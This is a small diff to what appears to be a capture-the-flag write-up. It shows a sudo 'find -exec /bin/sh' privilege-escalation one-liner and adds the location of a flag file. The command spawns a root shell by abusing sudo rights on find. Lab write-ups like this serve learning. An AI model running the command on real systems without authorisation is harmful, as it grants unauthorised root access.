@@ -236,4 +236,4 @@ I looked up find on gtfobins, and it turns out we can exploit it.
 
 "sudo find . -exec /bin/sh \; -quit"
 
-Try "whoami" and see that you are root :)
+Try "whoami" and see that you are root :) flag2.txt is in /rootflag/
